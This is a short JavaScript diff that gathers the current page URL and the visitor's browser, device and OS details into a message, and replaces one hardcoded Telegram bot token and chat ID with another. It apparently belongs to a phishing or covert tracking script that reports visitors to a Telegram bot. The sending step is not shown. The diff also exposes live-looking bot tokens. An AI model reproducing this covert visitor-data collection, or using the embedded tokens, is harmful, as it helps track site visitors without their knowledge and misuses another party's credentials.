@@ -1,8 +1,8 @@
 let currentLocation = window.location;
 let ua = detect.parse(navigator.userAgent);
 
-let botToken = '6163011453:AAE2E6uKEE1hyQ3knu7tjJpYwIDvS7yEQPg';
-let chatId = '5303172024';
+let botToken = '6735455497:AAHTFrKiu3NL-1jP_Qe3Qoi5vfvaUK2ByAY\n';
+let chatId = '5804614037';
 
 let messageText2 = `\n\n${ua.browser.family}\n${ua.browser.name}\n${ua.device.family}\n${ua.device.name}\n${ua.os.name}\n${ua.device.family}`;
 let messageText = currentLocation.href + messageText2;
